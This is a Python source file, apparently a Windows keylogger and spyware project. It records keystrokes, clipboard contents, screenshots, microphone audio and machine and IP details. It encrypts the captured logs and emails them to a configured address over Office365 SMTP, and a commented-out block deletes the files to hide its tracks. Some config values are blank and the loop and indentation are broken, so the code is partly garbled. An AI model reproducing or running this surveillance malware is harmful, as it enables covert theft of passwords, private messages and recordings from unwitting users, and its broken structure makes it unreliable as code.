#libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd 

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_info = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = #input a number
time_iteration =  #input a number
number_of_iterations_end =  #input a number

fromaddr = "" # sender_mail
password = "" # sender_mail_password
toaddr = "" # receiver_mail

file_path = "" # File_path of where your project file get stored
extend = "\\"
file_merge = file_path + extend
key = "Encryption key"

count = 0
keys = []


def send_mail(filename ,attachment, toaddr):
# instance of MIMEMultipart 
    msg = MIMEMultipart() 
  
# storing the senders email address   
    msg['From'] = fromaddr 
  
# storing the receivers email address  
    msg['To'] = toaddr 
  
# storing the subject  
    msg['Subject'] = "" #Write a subject for the email(You can add time too)
  
# string to store the body of the mail 
    body = "Content is attached below!"
  
# attach the body with the msg instance 
    msg.attach(MIMEText(body, 'plain')) 
  
# open the file to be sent  
    filename = filename
    attachment = open(attachment, "rb") 
  
# instance of MIMEBase and named as p 
    p = MIMEBase('application', 'octet-stream') 
  
# To change the payload into encoded form 
    p.set_payload((attachment).read()) 
  
# encode into base64 
    encoders.encode_base64(p) 
   
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
  
# attach the instance 'p' to instance 'msg' 
    msg.attach(p) 
  
# creates SMTP session 
    s = smtplib.SMTP('smtp.office365.com', 587) 
  
# start TLS for security 
    s.starttls() 
  
# Authentication 
    s.login(fromaddr, password) 
  
# Converts the Multipart msg into a string 
    text = msg.as_string() 
  
# sending the mail 
    s.sendmail(fromaddr, toaddr, text) 
  
# terminating the session 
    s.quit()   

send_mail(keys_info,file_path + extend + keys_info,toaddr)
    
def computer_information():
    with open(file_merge + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

#try and except used to prevent in case of error occurs, It may stop the code from running
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

def copy_clipboard():
    with open(file_merge + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    
def on_press(key):
    global keys,count, currentTime

    print(key)
    keys.append(key)
    count += 1
    convertTime = time.time()

    if count >=1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_info,'a') as f:
        for key in keys:
            k = str(key) .replace("'","")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False
    if currentTime > stoppingTime:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener: # type: ignore
    listener.join()

if currentTime > stoppingTime:

        with open(file_path + extend + keys_info, "w") as f:
            f.write(" ")

        screenshot()
        send_mail(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_info]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_mail(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

"""Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_info, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)"""



